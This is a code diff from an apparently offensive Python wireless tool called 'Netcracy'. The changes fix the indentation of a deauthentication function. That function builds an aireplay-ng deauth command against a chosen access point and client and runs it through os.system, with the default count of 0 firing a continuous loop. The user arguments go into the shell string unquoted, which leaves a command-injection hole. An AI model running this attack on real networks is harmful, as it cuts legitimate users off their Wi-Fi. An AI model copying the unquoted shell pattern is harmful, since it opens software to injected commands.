@@ -123,10 +123,10 @@ def handle_targeted_scan(args):
     print(f"\n[+] Netcracy -> Deploying Optimized Spectrum Interceptor on {target_device}...")
     enforce_monitor_mode(target_device)
 
-    def handle_deauth(args):
+def handle_deauth(args):
     target_device = args[0] if len(args) >= 1 else "wlan0"
     target_bssid  = args[1] if len(args) >= 2 else ""
-    deauth_range  = args[2] if len(args) >= 3 else "0"  # 0 fires a continuous loop
+    deauth_range  = args[2] if len(args) >= 3 else "0"
     client_mac    = args[3] if len(args) >= 4 else ""
 
     print(f"\n[+] Netcracy -> Launching Deauth Framework...")
@@ -136,9 +136,7 @@ def handle_targeted_scan(args):
         print(f"[*] Target Access Point BSSID: {target_bssid}")
         print(f"[*] Burst Range Counter      : {deauth_range}")
         
-        # Base string build matching your tool's os.system convention
         cmd = f"sudo aireplay-ng --deauth {deauth_range} -a {target_bssid}"
-        
         if client_mac:
             print(f"[*] Isolating Target Client   : {client_mac}")
             cmd += f" -c {client_mac}"
@@ -147,6 +145,7 @@ def handle_targeted_scan(args):
         os.system(cmd)
     else:
         print("[-] Target Error: Access Point BSSID parameter required for deauth operations.")
+        
         
     
     if target_bssid and target_channel:
